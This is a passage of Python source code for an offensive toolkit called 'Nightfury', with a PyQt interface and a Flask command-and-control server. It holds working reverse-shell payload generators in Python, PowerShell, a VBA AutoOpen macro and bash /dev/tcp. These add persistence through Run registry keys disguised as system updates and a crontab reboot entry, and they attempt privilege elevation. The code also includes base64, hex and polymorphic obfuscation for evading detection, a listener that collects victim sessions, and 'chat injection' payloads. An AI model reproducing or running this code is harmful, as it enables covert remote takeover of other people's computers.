        self.network_info_btn.clicked.connect(lambda: self.run_post_action('network_info'))
        actions_layout.addWidget(self.network_info_btn)
        
        self.browser_data_btn = QPushButton("Extract Browser Data")
        self.browser_data_btn.clicked.connect(lambda: self.run_post_action('browser_data'))
        actions_layout.addWidget(self.browser_data_btn)
        
        self.system_info_btn = QPushButton("Gather System Info")
        self.system_info_btn.clicked.connect(lambda: self.run_post_action('system_info'))
        actions_layout.addWidget(self.system_info_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.results_display = QTextEdit()
        self.results_display.setReadOnly(True)
        results_layout.addWidget(self.results_display)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(post_tab, "Post-Exploitation")
    
    def _create_module_editor_tab(self):
        """Create the module editor tab"""
        editor_tab = QWidget()
        layout = QVBoxLayout(editor_tab)
        
        # Module info
        info_group = QGroupBox("Module Information")
        info_layout = QFormLayout()
        
        self.module_name = QLineEdit()
        info_layout.addRow("Module Name:", self.module_name)
        
        self.module_description = QTextEdit()
        self.module_description.setMaximumHeight(100)
        info_layout.addRow("Description:", self.module_description)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # Code editor
        editor_group = QGroupBox("Module Code")
        editor_layout = QVBoxLayout()
        self.code_editor = QTextEdit()
        editor_layout.addWidget(self.code_editor)
        editor_group.setLayout(editor_layout)
        layout.addWidget(editor_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.new_module_btn = QPushButton("New Module")
        self.new_module_btn.clicked.connect(self.new_module)
        button_layout.addWidget(self.new_module_btn)
        
        self.save_module_btn = QPushButton("Save Module")
        self.save_module_btn.clicked.connect(self.save_module)
        button_layout.addWidget(self.save_module_btn)
        
        self.load_module_btn = QPushButton("Load Module")
        self.load_module_btn.clicked.connect(self.load_module)
        button_layout.addWidget(self.load_module_btn)
        
        self.run_module_btn = QPushButton("Run Module")
        self.run_module_btn.clicked.connect(self.run_module)
        button_layout.addWidget(self.run_module_btn)
        
        layout.addLayout(button_layout)
        
        self.content_area.addTab(editor_tab, "Module Editor")
    
    def _create_osint_tab(self):
        """Create the OSINT tab"""
        osint_tab = QWidget()
        layout = QVBoxLayout(osint_tab)
        
        # Target input
        target_group = QGroupBox("OSINT Target")
        target_layout = QFormLayout()
        
        self.osint_target = QLineEdit()
        self.osint_target.setPlaceholderText("Enter domain, IP, username, or email")
        target_layout.addRow("Target:", self.osint_target)
        
        self.osint_type = QComboBox()
        self.osint_type.addItems(["domain", "ip", "username", "email", "phone"])
        target_layout.addRow("Type:", self.osint_type)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("OSINT Actions")
        actions_layout = QHBoxLayout()
        
        self.whois_btn = QPushButton("WHOIS Lookup")
        self.whois_btn.clicked.connect(self.whois_lookup)
        actions_layout.addWidget(self.whois_btn)
        
        self.dns_btn = QPushButton("DNS Enumeration")
        self.dns_btn.clicked.connect(self.dns_enum)
        actions_layout.addWidget(self.dns_btn)
        
        self.subdomain_btn = QPushButton("Subdomain Scan")
        self.subdomain_btn.clicked.connect(self.subdomain_scan)
        actions_layout.addWidget(self.subdomain_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("OSINT Results")
        results_layout = QVBoxLayout()
        self.osint_results = QTextEdit()
        self.osint_results.setReadOnly(True)
        results_layout.addWidget(self.osint_results)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(osint_tab, "OSINT")
    
    def _create_targets_tab(self):
        """Create the targets management tab"""
        targets_tab = QWidget()
        layout = QVBoxLayout(targets_tab)
        
        # Targets list
        targets_group = QGroupBox("Predefined Targets")
        targets_layout = QVBoxLayout()
        
        self.targets_list = QListWidget()
        self.targets_list.addItems(self.target_manager.list_targets())
        self.targets_list.itemClicked.connect(self.on_target_selected)
        targets_layout.addWidget(self.targets_list)
        
        # Add/remove buttons
        target_buttons = QHBoxLayout()
        
        self.add_target_btn = QPushButton("Add Target")
        self.add_target_btn.clicked.connect(self.add_target)
        target_buttons.addWidget(self.add_target_btn)
        
        self.remove_target_btn = QPushButton("Remove Target")
        self.remove_target_btn.clicked.connect(self.remove_target)
        target_buttons.addWidget(self.remove_target_btn)
        
        targets_layout.addLayout(target_buttons)
        targets_group.setLayout(targets_layout)
        layout.addWidget(targets_group)
        
        # Target details
        details_group = QGroupBox("Target Details")
        details_layout = QFormLayout()
        
        self.target_name = QLineEdit()
        details_layout.addRow("Name:", self.target_name)
        
        self.target_type = QComboBox()
        self.target_type.addItems(["website", "server", "network", "application"])
        details_layout.addRow("Type:", self.target_type)
        
        self.target_modules = QLineEdit()
        self.target_modules.setPlaceholderText("Comma-separated module names")
        details_layout.addRow("Modules:", self.target_modules)
        
        self.target_notes = QTextEdit()
        self.target_notes.setMaximumHeight(100)
        details_layout.addRow("Notes:", self.target_notes)
        
        self.save_target_btn = QPushButton("Save Changes")
        self.save_target_btn.clicked.connect(self.save_target)
        details_layout.addRow(self.save_target_btn)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        self.content_area.addTab(targets_tab, "Targets")
    
    def _create_settings_tab(self):
        """Create the settings tab"""
        settings_tab = QWidget()
        layout = QVBoxLayout(settings_tab)
        
        # General settings
        general_group = QGroupBox("General Settings")
        general_layout = QFormLayout()
        
        self.auto_load_modules = QCheckBox("Auto-load modules on startup")
        general_layout.addRow("Auto-load:", self.auto_load_modules)
        
        self.auto_save = QCheckBox("Auto-save projects")
        general_layout.addRow("Auto-save:", self.auto_save)
        
        self.dark_mode = QCheckBox("Dark mode")
        self.dark_mode.setChecked(True)
        self.dark_mode.stateChanged.connect(self.toggle_dark_mode)
        general_layout.addRow("Theme:", self.dark_mode)
        
        general_group.setLayout(general_layout)
        layout.addWidget(general_group)
        
        # Network settings
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.proxy_host = QLineEdit()
        network_layout.addRow("Proxy Host:", self.proxy_host)
        
        self.proxy_port = QLineEdit()
        network_layout.addRow("Proxy Port:", self.proxy_port)
        
        self.use_tor = QCheckBox("Use Tor network")
        network_layout.addRow("Tor:", self.use_tor)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Save settings button
        self.save_settings_btn = QPushButton("Save Settings")
        self.save_settings_btn.clicked.connect(self.save_settings)
        layout.addWidget(self.save_settings_btn)
        
        self.content_area.addTab(settings_tab, "Settings")
    
    def _apply_dark_theme(self):
        """Apply a dark theme to the application"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        self.setStyleSheet("""
            QToolTip { color: #ffffff; background-color: #2a82da; border: 1px solid white; }
            QMenu::item:selected { background-color: #2a82da; }
            QTabWidget::pane { border: 1px solid #444; }
            QGroupBox { font-weight: bold; }
            QTextEdit, QLineEdit, QListWidget { background-color: #252525; color: #ffffff; }
        """)
    
    def load_modules(self):
        """Load modules from the modules directory"""
        self.status_bar.showMessage("Loading modules...")
        self.module_list.clear()
        
        # Start module loading in a separate thread
        self.loader_thread = ModuleLoaderThread(self.module_loader)
        self.loader_thread.module_loaded.connect(self.add_module_to_list)
        self.loader_thread.finished.connect(lambda: self.status_bar.showMessage("Modules loaded", 3000))
        self.loader_thread.start()
    
    def add_module_to_list(self, module_name):
        """Add a module to the module list"""
        item = QListWidgetItem(module_name)
        self.module_list.addItem(item)
    
    def on_module_selected(self, item):
        """Handle module selection"""
        module_name = item.text()
        try:
            info = self.module_loader.get_module_info(module_name)
            self.show_module_info(info)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to get module info: {e}")
    
    def show_module_info(self, info):
        """Display module information"""
        # Display module info in the dashboard
        info_text = f"""
        Module Name: {info['name']}
        Description: {info['description']}
        File: {info['file']}
        
        Functions:
        """
        
        for func in info['functions']:
            info_text += f"\n- {func['name']}{func['signature']}"
            if func['docstring']:
                info_text += f"\n  {func['docstring']}\n"
        
        self.recent_activity.setPlainText(info_text)
    
    def generate_payload(self):
        """Generate a reverse shell payload"""
        try:
            shell_type = self.shell_type.currentText()
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            obfuscate = self.obfuscate_check.isChecked()
            
            options = {'obfuscate': obfuscate}
            payload = self.shell_generator.generate(shell_type, lhost, lport, options)
            
            self.payload_display.setPlainText(payload)
            self.status_bar.showMessage("Payload generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate payload: {e}")
    
    def generate_injection(self):
        """Generate a chat injection payload"""
        try:
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            platform = self.platform_select.currentText()
            
            injection = self.shell_generator.generate_chat_injection(lhost, lport, platform)
            
            self.payload_display.setPlainText(injection)
            self.status_bar.showMessage("Injection generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate injection: {e}")
    
    def copy_payload(self):
        """Copy payload to clipboard"""
        payload = self.payload_display.toPlainText()
        if payload:
            clipboard = QApplication.clipboard()
            clipboard.setText(payload)
            self.status_bar.showMessage("Payload copied to clipboard", 3000)
        else:
            QMessageBox.warning(self, "Warning", "No payload to copy")
    
    def start_listener(self):
        """Start the reverse shell listener"""
        try:
            host = self.listener_host.text()
            port = int(self.listener_port.text())
            
            if self.listener and self.listener.isRunning():
                self.listener.stop()
                self.listener.wait()
            
            self.listener = ReverseShellListener(host, port)
            self.listener.connection_update.connect(self.update_listener_status)
            self.listener.command_output.connect(self.update_listener_output)
            self.listener.start()
            
            self.start_listener_btn.setEnabled(False)
            self.stop_listener_btn.setEnabled(True)
            self.listener_status.setText("Status: Listening")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to start listener: {e}")
    
    def stop_listener(self):
        """Stop the reverse shell listener"""
        if self.listener and self.listener.isRunning():
            self.listener.stop()
            self.listener.wait()
            
            self.start_listener_btn.setEnabled(True)
            self.stop_listener_btn.setEnabled(False)
            self.listener_status.setText("Status: Stopped")
    
    def update_listener_status(self, message):
        """Update the listener status display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def update_listener_output(self, message):
        """Update the listener output display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def run_post_action(self, action):
        """Run a post-exploitation action"""
        try:
            os_type = self.target_os.currentText()
            commands = self.post_exploit.execute(os_type, action)
            
            result = f"Commands for {action} on {os_type}:\n\n"
            for cmd in commands:
                result += f"{cmd}\n"
            
            self.results_display.setPlainText(result)
            self.status_bar.showMessage(f"Generated {action} commands", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate commands: {e}")
    
    def new_module(self):
        """Create a new module"""
        self.module_name.clear()
        self.module_description.clear()
        self.code_editor.clear()
        
        # Add template code
        template = '''
def execute(*args, **kwargs):
    """
    Module execution function.
    Add your module code here.
    """
    # Your code here
    return {"result": "Module executed successfully"}
'''
        self.code_editor.setPlainText(template)
    
    def save_module(self):
        """Save the current module"""
        try:
            name = self.module_name.text().strip()
            if not name:
                QMessageBox.warning(self, "Warning", "Please enter a module name")
                return
            
            description = self.module_description.toPlainText().strip()
            code = self.code_editor.toPlainText()
            
            # Create module file
            module_path = os.path.join("modules", f"{name}.py")
            with open(module_path, "w") as f:
                if description:
                    f.write(f'"""{description}"""\n\n')
                f.write(code)
            
            self.status_bar.showMessage(f"Module {name} saved", 3000)
            
            # Reload modules
            self.load_modules()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to save module: {e}")
    
    def load_module(self):
        """Load a module for editing"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to load")
            return
        
        module_name = selected_items[0].text()
        try:
            info = self.module_loader.get_module_info(module_name)
            
            self.module_name.setText(module_name)
            self.module_description.setPlainText(info.get('description', ''))
            
            # Read the module file
            with open(info['file'], 'r') as f:
                code = f.read()
            
            self.code_editor.setPlainText(code)
            self.status_bar.showMessage(f"Module {module_name} loaded", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to load module: {e}")
    
    def run_module(self):
        """Run the current module"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to run")
            return
        
        module_name = selected_items[0].text()
        try:
            result = self.module_loader.execute_module(module_name)
            QMessageBox.information(self, "Module Result", f"Module executed successfully:\n\n{result}")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to execute module: {e}")
    
    def whois_lookup(self):
        """Perform a WHOIS lookup"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            w = whois.whois(target)
            result = json.dumps(w, indent=2, default=str)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("WHOIS lookup completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"WHOIS lookup failed: {e}")
    
    def dns_enum(self):
        """Perform DNS enumeration"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
            results = {}
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(target, record_type)
                    results[record_type] = [str(r) for r in answers]
                except:
                    results[record_type] = []
            
            result = json.dumps(results, indent=2)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("DNS enumeration completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"DNS enumeration failed: {e}")
    
    def subdomain_scan(self):
        """Perform subdomain scanning"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
                'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3'
            ]
            
            found_subdomains = []
            
            for subdomain in common_subdomains:
                full_domain = f"{subdomain}.{target}"
                try:
                    socket.gethostbyname(full_domain)
                    found_subdomains.append(full_domain)
                except:
                    pass
            
            result = f"Found {len(found_subdomains)} subdomains:\n\n" + "\n".join(found_subdomains)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("Subdomain scan completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Subdomain scan failed: {e}")
    
    def on_target_selected(self, item):
        """Handle target selection"""
        target_name = item.text()
        target_info = self.target_manager.get_target(target_name)
        
        if target_info:
            self.target_name.setText(target_name)
            self.target_type.setCurrentText(target_info['type'])
            self.target_modules.setText(",".join(target_info['modules']))
            self.target_notes.setPlainText(target_info['notes'])
    
    def add_target(self):
        """Add a new target"""
        name, ok = QInputDialog.getText(self, "Add Target", "Enter target name:")
        if ok and name:
            self.target_manager.add_target(name, "website", [], "")
            self.targets_list.addItem(name)
            self.status_bar.showMessage(f"Target {name} added", 3000)
    
    def remove_target(self):
        """Remove the selected target"""
        selected_items = self.targets_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a target to remove")
            return
        
        target_name = selected_items[0].text()
        self.target_manager.remove_target(target_name)
        self.targets_list.takeItem(self.targets_list.row(selected_items[0]))
        self.status_bar.showMessage(f"Target {target_name} removed", 3000)
    
    def save_target(self):
        """Save target changes"""
        name = self.target_name.text().strip()
        if not name:
            QMessageBox.warning(self, "Warning", "Please enter a target name")
            return
        
        target_type = self.target_type.currentText()
        modules = [m.strip() for m in self.target_modules.text().split(",") if m.strip()]
        notes = self.target_notes.toPlainText()
        
        self.target_manager.add_target(name, target_type, modules, notes)
        
        # Update the list if the name changed
        current_items = self.targets_list.findItems(name, Qt.MatchExactly)
        if not current_items:
            self.targets_list.addItem(name)
        
        self.status_bar.showMessage(f"Target {name} saved", 3000)
    
    def load_settings(self):
        """Load application settings"""
        self.auto_load_modules.setChecked(self.settings.value("auto_load_modules", True, type=bool))
        self.auto_save.setChecked(self.settings.value("auto_save", True, type=bool))
        self.dark_mode.setChecked(self.settings.value("dark_mode", True, type=bool))
        self.proxy_host.setText(self.settings.value("proxy_host", ""))
        self.proxy_port.setText(self.settings.value("proxy_port", ""))
        self.use_tor.setChecked(self.settings.value("use_tor", False, type=bool))
    
    def save_settings(self):
        """Save application settings"""
        self.settings.setValue("auto_load_modules", self.auto_load_modules.isChecked())
        self.settings.setValue("auto_save", self.auto_save.isChecked())
        self.settings.setValue("dark_mode", self.dark_mode.isChecked())
        self.settings.setValue("proxy_host", self.proxy_host.text())
        self.settings.setValue("proxy_port", self.proxy_port.text())
        self.settings.setValue("use_tor", self.use_tor.isChecked())
        
        self.status_bar.showMessage("Settings saved", 3000)
    
    def toggle_dark_mode(self, state):
        """Toggle dark mode"""
        if state == Qt.Checked:
            self._apply_dark_theme()
        else:
            self.setPalette(QApplication.style().standardPalette())
            self.setStyleSheet("")
    
    def quick_scan(self):
        """Perform a quick scan"""
        self.status_bar.showMessage("Quick scan started...")
        # Implementation would go here
        QMessageBox.information(self, "Quick Scan", "Quick scan completed")
    
    def quick_payload(self):
        """Quick payload generation"""
        self.content_area.setCurrentIndex(1)  # Switch to reverse shell tab
        self.generate_payload()
    
    def quick_exploit(self):
        """Quick exploit"""
        self.content_area.setCurrentIndex(2)  # Switch to post-exploit tab
        self.status_bar.showMessage("Quick exploit started...")
        # Implementation would go here
    
    def new_project(self):
        """Create a new project"""
        # Implementation would go here
        self.status_bar.showMessage("New project created", 3000)
    
    def open_project(self):
        """Open an existing project"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Open Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Opened project: {filename}", 3000)
    
    def save_project(self):
        """Save the current project"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Saved project: {filename}", 3000)
    
    def open_settings(self):
        """Open settings dialog"""
        self.content_area.setCurrentIndex(6)  # Switch to settings tab

# ==============================
# MAIN EXECUTION
# ==============================

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle("Fusion")
    
    # Create and show the main window
    window = NightfuryApp()
    window.show()
    
    # Run the application
    sys.exit(app.exec_())

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import subprocess
import threading
import time
import os
import sys
import json
import random
import socket
import ipaddress
import logging
from datetime import datetime
import uuid
import base64
import zipfile
import tempfile
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'nightfury-secret-key-2023'
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)

# Global state
listeners = {}
sessions = {}
active_modules = {}
scan_results = {}
payload_history = []

class Listener:
    def __init__(self, lhost, lport, protocol):
        self.lhost = lhost
        self.lport = lport
        self.protocol = protocol
        self.running = False
        self.thread = None
        self.socket = None
        self.id = str(uuid.uuid4())[:8]
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.lhost, self.lport))
            self.socket.listen(5)
            self.running = True
            
            # Start listener thread
            self.thread = threading.Thread(target=self.listen_for_connections)
            self.thread.daemon = True
            self.thread.start()
            
            logger.info(f"Listener started on {self.lhost}:{self.lport}")
            socketio.emit('listener_update', {
                'id': self.id,
                'status': 'running',
                'lhost': self.lhost,
                'lport': self.lport,
                'protocol': self.protocol,
                'connections': 0
            })
            
            return True, "Listener started successfully"
        except Exception as e:
            logger.error(f"Failed to start listener: {e}")
            return False, f"Failed to start listener: {e}"
    
    def listen_for_connections(self):
        while self.running:
            try:
                client_socket, addr = self.socket.accept()
                logger.info(f"Connection received from {addr[0]}:{addr[1]}")
                
                # Create a new session
                session_id = str(uuid.uuid4())[:8]
                session = {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'socket': client_socket,
                    'connected_at': datetime.now().isoformat(),
                    'last_activity': datetime.now().isoformat(),
                    'os': 'unknown',
                    'user': 'unknown'
                }
                
                sessions[session_id] = session
                
                # Send session info to frontend
                socketio.emit('new_session', {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'connected_at': session['connected_at'],
                    'os': session['os'],
                    'user': session['user']
                })
                
                # Handle session in a new thread
                session_thread = threading.Thread(
                    target=self.handle_session,
                    args=(session_id,)
                )
                session_thread.daemon = True
                session_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error in listener: {e}")
    
    def handle_session(self, session_id):
        session = sessions.get(session_id)
        if not session:
            return
        
        try:
            while self.running and session_id in sessions:
                # Receive data from the client
                data = session['socket'].recv(4096)
                if not data:
                    break
                
                # Update last activity
                session['last_activity'] = datetime.now().isoformat()
                sessions[session_id] = session
                
                # Process the received data
                message = data.decode('utf-8', errors='ignore')
                logger.info(f"Received from session {session_id}: {message}")
                
                # Send to frontend
                socketio.emit('session_output', {
                    'session_id': session_id,
                    'output': message,
                    'timestamp': datetime.now().isoformat()
                })
                
        except Exception as e:
            logger.error(f"Error handling session {session_id}: {e}")
        finally:
            # Clean up session
            if session_id in sessions:
                sessions.pop(session_id, None)
                socketio.emit('session_closed', {'session_id': session_id})
    
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
        
        logger.info(f"Listener stopped on {self.lhost}:{self.lport}")
        socketio.emit('listener_update', {
            'id': self.id,
            'status': 'stopped',
            'lhost': self.lhost,
            'lport': self.lport,
            'protocol': self.protocol,
            'connections': 0
        })
        
        return True, "Listener stopped successfully"

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'python': self._generate_python_payload,
            'powershell': self._generate_powershell_payload,
            'executable': self._generate_exe_payload,
            'dll': self._generate_dll_payload,
            'macro': self._generate_macro_payload,
            'android': self._generate_android_payload,
            'linux': self._generate_linux_payload
        }
    
    def generate(self, payload_type, lhost, lport, options=None):
        if payload_type not in self.templates:
            return None, f"Unsupported payload type: {payload_type}"
        
        if options is None:
            options = {}
        
        try:
            payload, filename = self.templates[payload_type](lhost, lport, options)
            
            # Store in history
            payload_id = str(uuid.uuid4())[:8]
            payload_history.append({
                'id': payload_id,
                'type': payload_type,
                'lhost': lhost,
                'lport': lport,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            })
            
            return payload, filename, payload_id
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return None, f"Error generating payload: {e}", None
    
    def _generate_python_payload(self, lhost, lport, options):
        obfuscation = options.get('obfuscation', 'basic')
        
        payload = f'''
import socket,os,subprocess,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscation != 'none':
            payload = self._obfuscate_python(payload, obfuscation)
        
        filename = f"payload_{lhost}_{lport}.py"
        return payload, filename
    
    def _generate_powershell_payload(self, lhost, lport, options):
        payload = f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        filename = f"payload_{lhost}_{lport}.ps1"
        return payload, filename
    
    def _generate_exe_payload(self, lhost, lport, options):
        # This would use pyinstaller or other tools to create an executable
        # For now, we'll create a Python script that can be compiled
        python_payload, _ = self._generate_python_payload(lhost, lport, options)
        filename = f"payload_{lhost}_{lport}.py"
        
        # In a real implementation, we would compile this to an executable
        return python_payload, filename
    
    def _generate_dll_payload(self, lhost, lport, options):
        # Placeholder for DLL generation
        payload = f'''
// DLL payload for {lhost}:{lport}
// This would be compiled to a DLL file
'''
        filename = f"payload_{lhost}_{lport}.dll"
        return payload, filename
    
    def _generate_macro_payload(self, lhost, lport, options):
        payload = f'''
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""
    Shell payload, vbHide
End Sub
'''
        filename = f"payload_{lhost}_{lport}.vba"
        return payload, filename
    
    def _generate_android_payload(self, lhost, lport, options):
        # Placeholder for Android payload
        payload = f'''
// Android payload for {lhost}:{lport}
// This would be compiled to an APK file
'''
        filename = f"payload_{lhost}_{lport}.apk"
        return payload, filename
    
    def _generate_linux_payload(self, lhost, lport, options):
        payload = f'''
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null
    sleep 10
done
'''
        filename = f"payload_{lhost}_{lport}.sh"
        return payload, filename
    
    def _obfuscate_python(self, code, level):
        if level == 'basic':
            # Basic base64 obfuscation
            obfuscated = base64.b64encode(code.encode()).decode()
            parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
            reconstructed = " + ".join([f'"{part}"' for part in parts])
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode({reconstructed}).decode())
'''
            return final_code
        
        elif level == 'advanced':
            # More advanced obfuscation with multiple encoding layers
            b64_encoded = base64.b64encode(code.encode()).decode()
            hex_encoded = b64_encoded.encode().hex()
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode(bytes.fromhex("{hex_encoded}").decode()).decode())
'''
            return final_code
        
        elif level == 'polymorphic':
            # Simple polymorphic example - in a real implementation this would be more complex
            var_names = ['func_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) for _ in range(3)]
            
            b64_encoded = base64.b64encode(code.encode()).decode()
            parts = [b64_encoded[i:i+30] for i in range(0, len(b64_encoded), 30)]
            
            final_code = f'''
{var_names[0]} = "{parts[0]}"
{var_names[1]} = "{parts[1]}" if True else ""
{var_names[2]} = "{"".join(parts[2:])}" if not False else ""
exec(__import__('base64').b64decode({var_names[0]} + {var_names[1]} + {var_names[2]}).decode())
'''
            return final_code
        
        return code

class PostExploitation:
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
